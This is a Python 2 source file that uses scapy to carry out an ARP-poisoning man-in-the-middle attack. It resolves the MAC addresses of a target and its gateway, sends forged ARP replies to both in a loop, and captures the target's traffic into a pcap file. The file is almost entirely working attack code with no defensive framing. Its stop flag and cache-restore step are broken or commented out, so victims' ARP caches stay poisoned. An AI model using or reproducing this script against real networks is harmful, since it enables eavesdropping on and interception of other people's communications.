from scapy.all import *
import os
import sys
import threading
interface  = "eth0"
packet_count = 1000
poisoning    = True    
class MidManAttack:
   
    def  __init__(self,TargetIp,GatewayIp):
        self.TargetIp=TargetIp
        self.GatewayIp=GatewayIp
        

    
    def restore_target(self,gateway_mac,target_mac):
        print "[+] Restoring target..."
        send(ARP(op=2, psrc=self.GatewayIp, pdst=self.TargetIp, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
        send(ARP(op=2, psrc=self.TargetIp, pdst=self.GatewayIp, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    
    def get_mac(self,ip_address):
        responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
        for s,r in responses:
            return r[Ether].src
        return None
    
    def poison_target(self,gateway_mac,target_mac):
        global poisoning
        poison_target = ARP()
        poison_target.op   = 2
        poison_target.psrc = self.GatewayIp
        poison_target.pdst = self.TargetIp
        poison_target.hwdst= target_mac
  
        poison_gateway = ARP()
        poison_gateway.op   = 2
        poison_gateway.psrc = self.TargetIp
        poison_gateway.pdst = self.GatewayIp
        poison_gateway.hwdst= gateway_mac
  
        print "[+] Beginning the ARP poison. [CTRL-C to stop]"
        while poisoning:
            send(poison_target)
            send(poison_gateway) 
        time.sleep(2)         
        print "[+] ARP poison attack finished."
        return
    def attack(self):
        conf.iface = interface
        conf.verb  = 0
        print "[+] Setting up %s" % interface
        gateway_mac = self.get_mac(self.GatewayIp)
        if gateway_mac is None:
            print "[-] Failed to get gateway MAC. Exiting."
            sys.exit(0)
        else:
            print "[+] Gateway %s is at %s" % (self.GatewayIp,gateway_mac)
        target_mac = self.get_mac(self.TargetIp)
        if target_mac is None:
            print "[-] Failed to get target MAC. Exiting."
            sys.exit(0)
        else:
            print "[+] Target %s is at %s" % (self.TargetIp,target_mac)
        poison_thread = threading.Thread(target=self.poison_target, args=(gateway_mac,target_mac))
        poison_thread.start()
        try:
            print "[+] Starting sniffer for %d packets" % packet_count    
            bpf_filter  = "ip host %s" % self.TargetIp
            packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)   
        except KeyboardInterrupt:
            pass         
        finally:
            print "[+] Writing packets to results.pcap"
            wrpcap('results.pcap',packets)
            poisoning = False
            #sys.exit(0)
            #time.sleep(2)
          #  self.restore_target(gateway_mac,target_mac)
            
